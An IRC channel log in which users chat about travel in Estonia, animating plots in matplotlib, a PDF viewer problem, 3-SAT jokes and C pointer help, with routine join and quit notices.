[17:23:07] <[itchyjunk]> How much $ did you need to 10 days?
[17:23:17] <[itchyjunk]> or how many ever days you were there
[17:23:23] <bomb> mspe aye. both Finland and Estonia are really cool
[17:23:26] <[itchyjunk]> i guess driving yourself saved a lot of transport costs
[17:23:29] *** Quits: X-Scale (~ARM@83.223.227.196) (Ping timeout: 268 seconds)
[17:23:40] <mrig> mspe days must be starting to really close in up there now.
[17:24:10] <mspe> we rented a car because we wanted to visit many different places all around the country, but next time I think wr'll focus on Tallinn and Tartu and will only use public transportation
[17:24:36] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[17:24:39] <mspe> mrig: the sun wasn't very high for the daytime duration, yes
[17:24:48] <mrig> ... what's the latitude ... 
[17:25:01] <mspe> many times I had to choose different angles to take pictures because of the sun never being above my head ^^
[17:25:08] <mrig> ah similar to the northen most tip if Britain.
[17:25:11] <[itchyjunk]> public train costs are kinda high,  i looked at it
[17:25:18] <[itchyjunk]> $100 euro or somesuch no?
[17:25:34] <CalimeroTeknik> cool indeed, around 6°C now round Helsinki, and it's the hot spot of the week
[17:25:35] <mspe> mrig: Tallinn is 59.4
[17:25:56] <mrig> wow that is pretty far north.
[17:26:12] *** Joins: rtypo (~alex@user/rtypo)
[17:26:16] *** Joins: Inline (~Inline@2a02:908:1252:7a80:ab95:d5d6:558a:3a83)
[17:26:21] <[itchyjunk]> has anyone here use matplotlib to animate before? is it intuitive?
[17:26:29] <mspe> before leaving, on November 2nd, it was 11-12°C in Tallinn, surprisingly
[17:27:46] *** Quits: derjanni (~textual@p5ddafd7f.dip0.t-ipconnect.de) (Quit: Textual IRC Client: www.textualapp.com)
[17:27:58] *** Joins: X-Scale (~ARM@83.223.240.168)
[17:28:38] *** Quits: _inky (~inky_@46.241.144.72) (Ping timeout: 260 seconds)
[17:29:11] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 256 seconds)
[17:29:11] *** Quits: X-Scale` (~ARM@165.201.137.78.rev.vodafone.pt) (Ping timeout: 256 seconds)
[17:30:53] <mrig> dang, cant find a setting to turn longitude and latitude on on google maps, there must be one somewhere, it would be nice in the traditional degrees minutes and seconds too.
[17:32:59] <mspe> I just did a right click to see coordinates
[17:33:12] *** Joins: dodocrypto (~dodocrypt@user/dodocrypto)
[17:33:22] <mspe> but yeah, ridiculous to not have coordinates while hovering
[17:33:44] *** Joins: Trieste_ (T@user/pilgrim)
[17:34:17] *** Quits: akevinhuang (~thekevinh@user/thekevinhuang) (Ping timeout: 256 seconds)
[17:34:36] *** Quits: Trieste (T@user/pilgrim) (Ping timeout: 268 seconds)
[17:39:12] <[itchyjunk]> going between java and python is tripping me a little
[17:39:18] <[itchyjunk]> i keep wanting to put ; at the end
[17:39:26] <bud> ok i made a function https://0x0.st/-5bO.txt
[17:39:27] <bayaz> Type: text/plain; charset=utf-8 
[17:39:34] <bud> notice the commented out part..
[17:39:36] <bomb> you can do that in Python
[17:39:57] <bud> i realised it doesn't work since member has a fixed type (JsonArray).
[17:40:46] <bud> i don't feel like using _Generic()..
[17:41:07] <Teckla> [itchyjunk]: :%s/;$/$/g
[17:41:12] *** Joins: otisolsen70 (~otisolsen@xd4ed80b5.cust.hiper.dk)
[17:41:32] *** Quits: mickey8 (~user@user/mickey) (Quit: Ping timeout (120 seconds))
[17:42:05] *** Joins: mickey8 (~user@user/mickey)
[17:44:02] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[17:44:28] *** Quits: Inhahe (inhahe@107-213-219-122.lightspeed.miamfl.sbcglobal.net) (Ping timeout: 268 seconds)
[17:45:18] *** Joins: Inhahe (inhahe@107-213-219-122.lightspeed.miamfl.sbcglobal.net)
[17:47:06] <jinsun> [itchyjunk]: you can put semcolon in the end in python, unnessesary but allowed
[17:47:14] <[itchyjunk]> ah
[17:47:34] <[itchyjunk]> i wanted to do animation in matplotlib, but idk what i am doing :(
[17:47:37] <[itchyjunk]> i am very lost
[17:48:29] *** Joins: LiftLeft (~LiftLeft@gateway/vpn/pia/liftleft)
[17:48:47] <jinsun> matplotlb is good for static plots, never seen anyone try animated stuff with that
[17:49:33] *** Quits: herjazz (~herjazz@p6758124-ipngn30801marunouchi.tokyo.ocn.ne.jp) (Quit: leaving)
[17:51:27] <mrig> ah yes, that gives the decimal version, I was more thinking of the traditional lines that you get traced on a map. It would be nice to be able to switch those on, and have the axis on the sides.
[17:51:29] <jinsun> [itchyjunk]: the matplotlib docs have examples, if you haven't looked at them already https://matplotlib.org/stable/gallery/index.html#animation
[17:51:29] <bayaz> Title: Gallery — Matplotlib 3.4.3 documentation 
[17:51:48] <[itchyjunk]> oops i forgot to paste my code
[17:51:49] <[itchyjunk]> https://bpa.st/4ZLA
[17:51:50] <bayaz> Title: View paste 4ZLA 
[17:52:22] <[itchyjunk]> jinsun, someone said matplot lib could do animations i wanted :<
[17:53:16] <[itchyjunk]> your link has soem fancy animation hmm
[17:54:02] *** Joins: _inky (~inky_@46.241.144.72)
[17:54:45] <jinsun> ya it can do probably, now how easy it would be to write that code I dunno because I never tried
[17:55:06] <[itchyjunk]> did you happen to see that one video i had linked to? I wanted to do stuff like that
[17:55:10] *** Joins: smallvil_ (~smallvill@cpe-172-193-72-46.qld.foxtel.net.au)
[17:55:24] <[itchyjunk]> its animated travelling salewoman problem getinng solved visually
[17:55:36] <[itchyjunk]> yeah this stuff looks complicated :< getting it animated
[17:55:45] <bomb> why do you do Python, I thought you were focused on Java lately?
[17:56:01] <jinsun> [itchyjunk]: what video?
[17:56:21] <[itchyjunk]> bomb, i thought py would be easier. java is being used for class final project :s
[17:56:26] * [itchyjunk] tries to find the link
[17:56:55] *** Joins: pingpongball (~pingpongb@103.94.252.85)
[17:56:59] <[itchyjunk]> https://www.youtube.com/watch?v=X-iSQQgOd1A
[17:57:00] <bayaz> Title: Coding Adventure: Ant and Slime Simulations 
[17:57:15] <bomb> [itchyjunk] I find Java and C# easier to develop & read than Python
[17:57:18] <[itchyjunk]> entire video is cool but i was hoping i could at least do the graph type stuff he does early on
[17:57:27] <[itchyjunk]> bomb, :S oh
[17:58:58] *** Quits: smallville7123 (~smallvill@cpe-172-193-72-46.qld.foxtel.net.au) (Ping timeout: 260 seconds)
[17:59:33] *** Quits: smallvil_ (~smallvill@cpe-172-193-72-46.qld.foxtel.net.au) (Read error: Connection reset by peer)
[18:01:05] *** Quits: rtypo (~alex@user/rtypo) (Read error: Connection reset by peer)
[18:01:36] *** Joins: rtypo (~alex@user/rtypo)
[18:01:39] <jinsun> well drawing a graph should be easy in matplotlib, it is just a bunch of straight lines and points
[18:01:58] *** Quits: pingpongball (~pingpongb@103.94.252.85) (Quit: Client closed)
[18:02:21] *** Quits: DarkTrick_ (~DarkTrick@pl-749-047.bunbun.ne.jp) (Ping timeout: 268 seconds)
[18:02:30] *** Quits: amigojapan (uid86330@id-86330.helmsley.irccloud.com) ()
[18:02:43] <[itchyjunk]> right, i figured out how to draw lines
[18:02:58] <[itchyjunk]> using matplotlib.pyplot
[18:03:24] <[itchyjunk]> it draw the whole thing in one go, i think i need it to draw 1 line per frame or somesuch
[18:03:27] <[itchyjunk]> for animation
[18:05:08] <wedr> It's Friday!
[18:05:23] <wedr> Here, I thought everyone's chatting about what's going on while programming
[18:06:09] <[itchyjunk]> i'm skipping school today as well. don't feel well
[18:06:22] <[itchyjunk]> looking at this animation code makes me feel overwhelmed
[18:06:27] <[itchyjunk]> i should probably do easier stuff
[18:06:41] <wedr> are you having a fever?
[18:06:50] *** Joins: tomathy (~jenova@user/quetzl)
[18:07:29] <tomathy> when you view any website, is the server sending you the website code?
[18:07:46] <d3x0r> often
[18:07:57] <wedr> 100% all the time
[18:07:57] <pyzozord> so I'm getting "if this message is not eventually replaced by proper contents (...) your PDF viewer may not be able to display this type of document. You can upgradeto the latest version of Adobe Reader (...)". In Chromium and Evince. Looks like Adobe has dropped support for Linux and the recommended way is to use wine. I tried installing latest Acrobad Reader via wine but that didn't work. Any 
[18:08:03] <pyzozord> ideas?
[18:08:07] <d3x0r> my index.html has 0 code
[18:08:20] <wedr> pyzozord, it didn't drop support on Ubuntu
[18:08:21] <d3x0r> HTML isn't 'code' :)
[18:08:50] <[itchyjunk]> yes, fever
[18:08:52] <[itchyjunk]> soar throat
[18:08:55] <tomathy> HTML is a programming language i thought
[18:09:13] <d3x0r> so in a sense it's code, but it's really not :)
[18:09:17] <d3x0r> it's just a configuration
[18:09:55] <tomathy> so if 500 peope view a html page, the server has had to send that 500 times?
[18:09:56] <pyzozord> wedr: they say here it did https://linuxconfig.org/how-to-install-adobe-acrobat-reader-on-ubuntu-20-04-focal-fossa-linux
[18:09:59] <d3x0r> yes
[18:10:14] <wedr> pyzozord, yeah, I just noticed it. What PDF viewer am I using?
[18:10:27] <pyzozord> html is code, but it is not a programming language :P
[18:10:34] *** Quits: rexar89 (~alexi5@208.83.82.234) ()
[18:11:00] <wedr> pyzozord, Ah, I'm just using the Ubuntu native Document Viewer 3.36.10   https://wiki.gnome.org/Apps/Evince
[18:11:01] <pyzozord> wedr: heh, I'd double check that, maybe you have some counterfit witha a trojan horse :P
[18:11:02] <bayaz> Title: Apps/Evince - GNOME Wiki! 
[18:11:07] <wedr> I can't believe this...
[18:11:21] <pyzozord> that's Evince. I get this error in both Chromium and Evince
[18:11:31] <wedr> I never did on my end.
[18:11:34] *** Joins: v01d4lph4 (~v01d4lph4@user/v01d4lph4)
[18:12:11] <wedr> pyzozord, Try dragging your PDF on top of the Chromium browser
[18:12:19] *** Joins: rustyshackleford (uid236774@id-236774.helmsley.irccloud.com)
[18:12:28] <pyzozord> again, I get this error in both Chromium and Evince
[18:12:54] <wedr> Do you have a screenshot?
[18:13:02] *** Quits: mickey8 (~user@user/mickey) (Quit: Ping timeout (120 seconds))
[18:13:14] <pyzozord> it just displays that placeholder error message
[18:13:22] *** Joins: mickey8 (~user@user/mickey)
[18:13:43] <wedr> wait, Chromium browser. Is this the Google Chrome browser, or this is the open-source Chromium browser?
[18:13:57] <pyzozord> that's the same browser
[18:14:07] <wedr> THen I truly don't see any errors
[18:14:09] <pyzozord> just all google crap is removed
[18:14:23] <pyzozord> I don't get this on every pdf, on one specific pdf
[18:15:11] <wedr> oh... then it's likely that PDF uses a feature that's exclusive for Adobe Acrobat Reader
[18:15:48] <pyzozord> yeah but acrobat reaeder has dropped support for linux and I tried installing windows version via wine and that didn't work
[18:16:22] <wedr> Dual boot a Windows machine and read that PDF from there.
[18:17:35] *** Joins: tane (~tane@dslb-002-201-234-197.002.201.pools.vodafone-ip.de)
[18:17:35] *** Quits: tane (~tane@dslb-002-201-234-197.002.201.pools.vodafone-ip.de) (Changing host)
[18:17:35] *** Joins: tane (~tane@user/tane)
[18:18:37] *** Joins: otisolsen70_ (~otisolsen@xd4ed80b5.cust.hiper.dk)
[18:18:43] <jinsun> or install windows in a VM
[18:18:59] *** Quits: Khoyo (~khoyo@user/khoyo) (Ping timeout: 264 seconds)
[18:21:21] *** Quits: dodocrypto (~dodocrypt@user/dodocrypto) (Quit: Leaving)
[18:22:27] *** Quits: otisolsen70 (~otisolsen@xd4ed80b5.cust.hiper.dk) (Ping timeout: 256 seconds)
[18:23:15] *** Quits: shibboleth (~shibbolet@user/shibboleth) (Quit: shibboleth)
[18:24:33] *** Quits: chomwitt (~chomwitt@ppp-2-85-245-90.home.otenet.gr) (Ping timeout: 268 seconds)
[18:24:33] *** Joins: Khoyo (~khoyo@user/khoyo)
[18:25:25] *** Quits: otisolsen70_ (~otisolsen@xd4ed80b5.cust.hiper.dk) (Remote host closed the connection)
[18:25:43] *** Joins: otisolsen70 (~otisolsen@xd4ed80b5.cust.hiper.dk)
[18:25:59] *** Joins: ricky (rickybob@gateway/vpn/protonvpn/rickybob)
[18:26:46] *** Quits: ixil (~ixil@82.197.178.137) (Remote host closed the connection)
[18:26:48] *** Joins: rickybob (uid410295@2a03:5180:f:1::6:42b7)
[18:26:48] *** Joins: arcatech (~arcatech@user/arcatech)
[18:27:24] *** Quits: wedr (~wedr@pool-108-20-128-8.bstnma.fios.verizon.net) (Remote host closed the connection)
[18:28:16] *** Joins: wedr (~wedr@pool-108-20-128-8.bstnma.fios.verizon.net)
[18:29:41] *** ricky is now known as rickybob2
[18:32:07] *** Quits: leduyquang753 (~leduyquan@user/leduyquang753) (Quit: Gotta go, see you guys later.)
[18:32:08] *** Joins: federico_it (~textual@151.95.125.195)
[18:33:01] <tomathy> Occams Blazer: the simplest way is the best way
[18:33:58] *** Joins: pulse (~pulse@user/pulse)
[18:41:02] <Trashlord> hmm
[18:45:51] *** Joins: chomwitt (~chomwitt@2a02:587:dc02:9f00:12c3:7bff:fe6d:d374)
[18:46:32] *** Quits: arcatech (~arcatech@user/arcatech) (Quit: Bye.)
[18:46:48] <CuriousErnestBro> they want me to reduce from 3-SAT to show NP hard
[18:46:50] <CuriousErnestBro> wtf
[18:47:08] <CuriousErnestBro> merijn am I doing theoretical CS now?
[18:49:02] <merijn> "reduce from" <- that seems wrong, don't you mean reduce *to* 3-SAT?
[18:50:35] *** Quits: rickybob2 (rickybob@gateway/vpn/protonvpn/rickybob) (Quit: pees oot)
[18:50:42] *** Joins: bl4cksyntax (~manas@122.161.52.186)
[18:51:02] *** Joins: lavos (~molt@178-222-245-206.static.isp.telekom.rs)
[18:51:08] *** Quits: bl4cksyntax (~manas@122.161.52.186) (Client Quit)
[18:54:58] *** Quits: molten (~molt@178-222-245-206.static.isp.telekom.rs) (Ping timeout: 260 seconds)
[18:56:33] <InPhase> Prove that 3-SAT is NP-hard by reducing it to 3-SAT.
[18:57:10] *** Quits: kron (~weechat@user/qaph) (Quit: kron)
[18:57:47] *** bomb is now known as honp
[18:57:56] *** honp is now known as bomb
[18:58:19] <InPhase> My next job interview question:  Demonstrate on the whiteboard that 3-SAT cannot be solved in polynomial time.
[18:59:42] <InPhase> "Must have 10 years of experience proving that P != NP"
[18:59:45] *** Joins: masta`` (~oyster@user/masta/x-2645138)
[19:01:20] *** Quits: repne_scasb (inhahe@107-213-219-122.lightspeed.miamfl.sbcglobal.net) (Read error: Connection reset by peer)
[19:01:38] *** Joins: repne_scasb (inhahe@107-213-219-122.lightspeed.miamfl.sbcglobal.net)
[19:02:04] <wedr> What is a 3-SAT?
[19:02:09] <wedr> Sounds foreign
[19:02:13] *** Quits: Xalphor (~hil@193.203.2.244) (Quit: Konversation terminated!)
[19:02:39] <|smlckz|> InPhase: which year is that, 2070 or 4200?
[19:03:12] <wedr> 20XX
[19:04:00] *** Quits: msmhnd^ (~msmhnd@wsip-98-188-242-6.mc.at.cox.net) (Ping timeout: 268 seconds)
[19:04:23] <wedr> No hell in way they're going to ask you to whiteboard a boolean satisifiability test
[19:04:46] *** Quits: interop_madness (~interop_m@user/interop-madness/x-0950004) (Quit: Leaving)
[19:06:32] <wedr> wait, maybe this might be useful if you're looking for an electrical engineering job, AI / Big Data job, and jobs where you rely on heavy math, like statistical analysts
[19:07:27] <[itchyjunk]> reeee nothing is working
[19:07:57] *** Joins: qbt (~qbt@user/edun)
[19:07:58] <[itchyjunk]> 3-SAT is a NP complete problem no?
[19:08:13] <merijn> [itchyjunk]: Yes
[19:08:19] <[itchyjunk]> someone was explainign to me how one np complete can be reduced to another one in polynomial time or somesuch
[19:08:21] <merijn> Or NP-hard, one of the two
[19:08:26] <[itchyjunk]> so if you solve one, you pabsically solve all
[19:08:40] *** Joins: blau (~blauu@ip-142-232-219-119.ptr.bcit.ca)
[19:08:55] *** Quits: rtypo (~alex@user/rtypo) (Ping timeout: 256 seconds)
[19:09:04] <[itchyjunk]> i want to draw a series of line in matplotlib and i can't figure it out. plz spoon feed me
[19:14:27] <wedr> Isn't there a line() method?
[19:14:42] <wedr> in pygame, it's pygame.draw.line(...)
[19:15:40] <wedr> I'm spoonfeeding you, but I didn't say that I will spoonfeed you with not the things you want.   MUHAHAHAHA  >:D
[19:15:51] <[itchyjunk]> hmm there is a matplotlib.pyplot.subplot thing
[19:16:00] <[itchyjunk]> i.e i can draw a bunch of line all at once
[19:16:12] <[itchyjunk]> but how do i draw a line, then another then another
[19:16:19] <[itchyjunk]> like an animation
[19:17:08] *** Joins: Macuser (~Macuser@2607:b400:26:0:9ca7:a8d7:21ee:5b22)
[19:17:12] <[itchyjunk]> ax.plot([1,2],[2,3]) will draw a line from 1,2 to 2,3
[19:17:23] <[itchyjunk]> but if i had anoother point in there, it all gets drawn at the same time
[19:18:09] *** Joins: magla (~gelignite@55d469ae.access.ecotel.net)
[19:18:30] <[itchyjunk]> maybe pygame is what i want
[19:18:44] <GeDaMo> https://matplotlib.org/stable/api/animation_api.html ?
[19:18:46] <bayaz> Title: matplotlib.animation — Matplotlib 3.4.3 documentation 
[19:19:43] <wedr> [itchyjunk], fine, very well.... have you looked into   matplotlib.animation ?
[19:21:25] *** Joins: rtypo (~alex@user/rtypo)
[19:23:53] *** Joins: AbleBacon (~AbleBacon@user/AbleBacon)
[19:24:53] *** Quits: wedr (~wedr@pool-108-20-128-8.bstnma.fios.verizon.net) (Quit: Leaving)
[19:24:56] *** Quits: pavonia (~user@user/siracusa) (Quit: Bye!)
[19:25:42] *** Joins: arcatech (~arcatech@user/arcatech)
[19:26:01] *** Joins: wedr (~wedr@pool-108-20-128-8.bstnma.fios.verizon.net)
[19:26:19] *** Quits: arcatech (~arcatech@user/arcatech) (Client Quit)
[19:26:31] <wedr> [itchyjunk], let me know if you finally found out about animating lines in a plot
[19:29:13] *** Quits: masta`` (~oyster@user/masta/x-2645138) (Read error: Connection reset by peer)
[19:30:09] *** Quits: reddishblue[m] (~reddishbl@2001:470:69fc:105::21eb) (Quit: You have been kicked for being idle)
[19:31:16] <tomathy> javascript is better than python
[19:31:25] *** Joins: Xaldafax (~xaldafax@cpe-198-72-160-101.socal.res.rr.com)
[19:32:58] <bomb> tomathy https://www.bleepingcomputer.com/news/security/popular-coa-npm-library-hijacked-to-steal-user-passwords/
[19:32:59] <bayaz> Title: Popular 'coa' NPM library hijacked to steal user passwords 
[19:33:08] *** Quits: z3t0 (~z3t0@146.71.14.98) (Quit: The Lounge - https://thelounge.chat)
[19:33:48] *** Quits: DevAntoine (~DevAntoin@2a01:e34:ec4e:a200:d0fd:3cfa:5fd6:6824) (Quit: Leaving...)
[19:34:18] <tomathy> when you're popular you have to deal with this stuff
[19:34:24] *** Quits: ExeciN (~ExeciN@user/nicexe) (Remote host closed the connection)
[19:34:54] *** Quits: kenanmarasli (~kenanmara@user/kenanmarasli) (Quit: Leaving)
[19:35:01] <bud> ok, i have a struct: s { GList *l;};
[19:35:04] <bomb> of couuurse. being popular is an excuse to have a terrible package management
[19:35:46] <bud> then a instance of that struct, being passed to a function that adds a list to l (instance->l).
[19:36:11] <bud> outside of said function it seems instance->l is unset..
[19:36:24] *** Quits: v01d4lph4 (~v01d4lph4@user/v01d4lph4) (Remote host closed the connection)
[19:41:07] *** Joins: arcatech (~arcatech@user/arcatech)
[19:41:12] *** Quits: Inhahe (inhahe@107-213-219-122.lightspeed.miamfl.sbcglobal.net) (Remote host closed the connection)
[19:41:24] <d3x0r> sounds like it failed to do it's job :)
[19:41:31] *** Joins: Inhahe (inhahe@107-213-219-122.lightspeed.miamfl.sbcglobal.net)
[19:41:33] <d3x0r> did you pass a struct instead of a reference/pointer to the struct?
[19:42:44] <bud> im not sure anymore, ill try to make a example (actual code is unreadable atm)
[19:46:27] *** Quits: arcatech (~arcatech@user/arcatech) (Quit: Bye.)
[19:47:46] <tomathy> there has been no advance in GUI's for about 20 years
[19:47:53] <tomathy> what we need is effective 3d
[19:48:02] <tomathy> clever invisibility
[19:48:21] *** Quits: szutt (~szutt@116.37.2.145) (Quit: Client closed)
[19:48:45] *** Joins: arcatech (~arcatech@user/arcatech)
[19:48:55] <tomathy> you should never have to minimise something
[19:49:15] <tomathy> just reach for it and it becomes enhanced
[19:50:12] <Bou> "reach for it" wearing a clunky headset and spill your coffee? yeah no
[19:51:21] *** Joins: v01d4lph4 (~v01d4lph4@106.215.93.204)
[19:51:21] *** Quits: v01d4lph4 (~v01d4lph4@106.215.93.204) (Changing host)
[19:51:21] *** Joins: v01d4lph4 (~v01d4lph4@user/v01d4lph4)
[19:52:35] *** Quits: arcatech (~arcatech@user/arcatech) (Client Quit)
[19:53:45] *** Joins: Hexmind (~Hexmind@modemcable049.25-131-66.mc.videotron.ca)
[19:53:55] *** Joins: smallville7123 (~smallvill@cpe-172-193-72-46.qld.foxtel.net.au)
[19:56:09] *** Quits: rsx (~dummy@ppp-188-174-137-236.dynamic.mnet-online.de) (Quit: rsx)
[19:56:14] <GeDaMo> Why would 3D or invisibility make GUIs better?
[19:56:19] <[itchyjunk]> wedr, matlplotlib.animation is what i am trying to figure out
[19:56:29] <[itchyjunk]> trying to repurpose example codes for my needs and failing
[19:56:33] *** Quits: smallville7123 (~smallvill@cpe-172-193-72-46.qld.foxtel.net.au) (Client Quit)
[19:58:20] *** Joins: mjs2600 (~mjs2600@c-24-91-3-49.hsd1.vt.comcast.net)
[19:58:27] *** Joins: arcatech (~arcatech@user/arcatech)
[19:59:57] *** Joins: CodeSpelunker (~CodeSpelu@user/codespelunker)
[20:00:53] <bud> ok, here is the example: https://0x0.st/-5c4.c
[20:00:54] <bayaz> Type: text/x-c; charset=utf-8 Size: 937 B 
[20:01:20] <bud> why is nothing printed from the last g_list_foreach (but there is for the first..)
[20:01:57] <bud> https://0x0.st/-5cJ.png
[20:01:58] <bayaz> Type: image/png Size: 288.2 kB 
[20:02:08] <bud> ^ see results in top left terminal
[20:02:59] *** Quits: mickey8 (~user@user/mickey) (Quit: Ping timeout (120 seconds))
[20:03:26] <bud> feels like i am missing something fundamental, but im not even sure how to phrase the question, except "how does pointers work?"
[20:04:08] *** Joins: lilgopher (~textual@c-24-12-183-227.hsd1.il.comcast.net)
[20:05:21] *** Joins: akevinhuang (~thekevinh@user/thekevinhuang)
[20:05:21] *** Joins: mickey8 (~user@user/mickey)
[20:05:41] *** Quits: Joanna (uid57472@id-57472.lymington.irccloud.com) (Quit: Connection closed for inactivity)
[20:06:08] <|smlckz|> ''how does pointers and arrays work?''
[20:06:36] *** Joins: Akuli (~Akuli@82-203-163-207.bb.dnainternet.fi)
[20:07:03] <tomathy> so you have a variable, that variable has a memory address and a value
[20:07:08] *** Quits: Macuser (~Macuser@2607:b400:26:0:9ca7:a8d7:21ee:5b22) (Quit: Textual IRC Client: www.textualapp.com)
[20:07:35] <tomathy> i think the reference is the memory address
[20:07:46] <tomathy> and the pointer turns the memory address to the value or something
[20:07:48] <tomathy> im probably wrong
[20:07:56] <tomathy> someone else take over
[20:08:05] <bud> ok, i guess i can ask the question now when i have the example. 
[20:08:32] <tomathy> best way to work stuff out is to try it
[20:08:56] <GeDaMo> bud: you overwrite struct_member in add_array_as_list_in_struct
[20:09:12] *** Quits: w0ng (~w0ng@103.1.212.100) (Ping timeout: 260 seconds)
[20:09:55] <GeDaMo> You're not changing the settings-array value on line 23, I'm pretty sure that settings->array never gets set to anything
[20:10:34] <bud> thanks. how would i set it to the list?
[20:10:59] <GeDaMo> I think you'll have to pass a pointer to a pointer to the function
[20:11:13] *** Quits: MRODE (~MRODE@212.91.174.218) (Ping timeout: 268 seconds)
[20:11:29] <GeDaMo> GList **struct_member; ... *struct_member = ...
[20:11:52] <GeDaMo> And call it with add_array_as_list_in_struct(&settings->array, ...
[20:12:10] *** Joins: alefir (~alefir@rrcs-24-43-248-58.west.biz.rr.com)
[20:12:40] <bud> nice!
[20:12:46] <bud> it worked!
[20:12:48] <GeDaMo> :)
[20:12:54] <bud> https://0x0.st/-5cw.c
[20:12:54] <bayaz> Type: text/x-c; charset=utf-8 Size: 942 B 
[20:14:37] *** Quits: v01d4lph4 (~v01d4lph4@user/v01d4lph4) (Read error: No route to host)
[20:14:57] *** Joins: v01d4lph4 (~v01d4lph4@106.215.93.204)
[20:14:57] *** Quits: v01d4lph4 (~v01d4lph4@106.215.93.204) (Changing host)
[20:14:57] *** Joins: v01d4lph4 (~v01d4lph4@user/v01d4lph4)
[20:15:01] *** Quits: mickey8 (~user@user/mickey) (Quit: Ping timeout (120 seconds))
[20:15:16] *** Joins: mickey8 (~user@user/mickey)
[20:16:30] *** Joins: BrianG61UK (~BrianG61U@2a02:8010:66b7:dddd:80f4:5e94:fde9:b446)
[20:17:06] *** Quits: BrianG61UK (~BrianG61U@2a02:8010:66b7:dddd:80f4:5e94:fde9:b446) (Remote host closed the connection)
[20:17:20] *** Quits: BrianG61UK_ (~BrianG61U@2a02:8010:66b7:dddd:d8fb:653:7302:119b) (Quit: Leaving)
[20:17:21] <tomathy> |smlckz|: https://paste.ofcode.org/iadhbRht7b65c2mt5XqsAC
[20:17:22] <bayaz> Title: Paste ofCode 
[20:18:26] <tomathy> i think that explains them fully
[20:18:56] <tomathy> the real question is how do you use pointers and references
[20:18:58] <tomathy> and i have no idea
[20:20:14] <|smlckz|> hmm? bud asked, not me..
[20:20:38] <pyzozord> tomathy: read K&R
[20:20:57] <tomathy> mb
[20:21:15] <bud> tomathy: thanks that snippet is also helpful.
[20:22:00] *** Quits: blau (~blauu@ip-142-232-219-119.ptr.bcit.ca) (Read error: Connection reset by peer)
[20:23:37] <Trashlord> you pass the pointers around
[20:23:48] <tomathy> no probs i needed it myself
[20:24:11] *** Quits: Inline (~Inline@2a02:908:1252:7a80:ab95:d5d6:558a:3a83) (Ping timeout: 268 seconds)
[20:24:41] <tomathy> is that a joke
[20:24:49] <tomathy> "you pass the pointers around"
[20:24:49] <Trashlord> about the pointers? no
[20:25:12] *** Joins: emf (~emf@2620:10d:c090:400::5:38d)
[20:25:29] <Trashlord> int *a = malloc(sizeof(int) * 10); func(a);
[20:25:36] <Trashlord> pass the pointer a to func
[20:25:51] *** Joins: CaCode (~CaCode@user/cacode)
[20:26:13] <tomathy> doesnt help
[20:26:15] <tomathy> just confuses
[20:26:20] <Trashlord> what are you trying to do?
[20:26:31] <tomathy> nothing 
[20:26:33] <GeDaMo> Pass a copy of a to the function
[20:26:38] <Trashlord> malloc() allocates memory
[20:26:49] <tomathy> ok
[20:27:14] <Trashlord> sizeof(type) returns the size of the type in bytes on the given platform, let's say 4 bytes for each int
[20:27:25] <tomathy> but is a a memory address?
[20:27:29] <bud> Trashlord: it was me who was having problems to grasp pointers of pointers of references shenanigans, but it works now.
[20:27:33] <Trashlord> so if you want to create for example an array of 10 integers, you need to allocate 40 bytes
[20:28:09] <Trashlord> a containers the address to the first element of the allocated memory "section"
[20:28:13] <Trashlord> contains(*
[20:28:26] *** Quits: spaceangel (~spaceange@ip-89-176-181-220.net.upcbroadband.cz) (Remote host closed the connection)
[20:28:41] *** Joins: edgar-rft (~edgar-rft@HSI-KBW-109-193-249-223.hsi7.kabel-badenwuerttemberg.de)
[20:28:43] <tomathy> sorry dude
[20:29:00] <Trashlord> still confused? I don't doubt it, it's not easy to explain without having some task to do with it
[20:29:05] *** Joins: BauComeTeuCu (~cppcon@2603-7000-d93f-e790-7836-858a-3d4c-66b9.res6.spectrum.com)
[20:29:17] <Trashlord> in fact I don't even fully understand C pointers myself. My C experience is limited
[20:29:20] *** Quits: kmh (~kmh@2a00:6020:5004:6800:bdaa:9635:9966:ac85) (Quit: Leaving)
[20:29:36] <Trashlord> I just know enough to use it generally. But might get tripped up sometimes
[20:30:21] <tomathy> i feel like malloc is a sin
[20:30:28] <Trashlord> why?
[20:30:35] <tomathy> sounds like Molech
[20:30:53] <Trashlord> stands for Memory ALLOCation (or allocator)
[20:31:02] <tomathy> feels like a god function
[20:31:14] * tomathy has never used it
[20:31:30] *** Quits: Booster2ooo (~Booster2o@user/booster2ooo) (Quit: KVIrc 4.2.0 Equilibrium http://www.kvirc.net/)
[20:31:36] <Trashlord> you gotta use it if you need to allocate more memory
[20:32:01] *** Quits: federico_it (~textual@151.95.125.195) (Quit: Textual IRC Client: www.textualapp.com)
[20:34:11] <Trashlord> tomathy: here, https://gist.github.com/SpiritualForest/f57f405cac234febe1439c8aa8d04798
[20:34:12] <bayaz> Title: Merge sort algorithm written in C 
[20:34:20] <Trashlord> this is a crappy merge sort implementation I wrote 2 years ago
[20:34:28] <beaky> nice i like merge sort
[20:35:03] <Trashlord> this one is terrible, though, because of how I made it allocate memory
[20:36:01] *** Quits: absc (~absc@81.31.144.28) (Quit: Leaving)
[20:36:51] <Trashlord> it repeatedly allocates memory to create new smaller lists to sort and merge, so in larger inputs it reaches millions of malloc/free calls
[20:37:44] *** Joins: gitgood (~gitgood@80-44-12-204.dynamic.dsl.as9105.com)
[20:39:16] *** Joins: stkrdknmibalz (~test@rrcs-75-87-43-226.sw.biz.rr.com)
[20:41:08] *** Joins: kmh (~kmh@2a00:6020:5004:6800:4f37:dee:2cfd:c127)
[20:42:51] *** Quits: v01d4lph4 (~v01d4lph4@user/v01d4lph4) (Remote host closed the connection)
[20:43:54] *** Joins: nostalgia (~nostalgia@110.8.30.213.rev.vodafone.pt)
[20:46:06] *** Quits: Photic (~Photic@user/photic) (Quit: Client closed)
[20:46:53] *** Joins: Inari (~Pinkishu@p508ef003.dip0.t-ipconnect.de)
[20:48:39] *** Quits: _inky (~inky_@46.241.144.72) (Ping timeout: 256 seconds)
[20:49:18] *** Quits: Klinda (~superleag@user/klinda) (Ping timeout: 260 seconds)
[20:55:00] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 268 seconds)
[20:55:24] *** Joins: Klinda (~superleag@user/klinda)
[20:57:47] *** Joins: src (~src@user/src)
[20:57:49] *** Joins: MrBungle (~MrBungle@2604:3d08:1788:dc00:e431:530c:9ef4:168a)
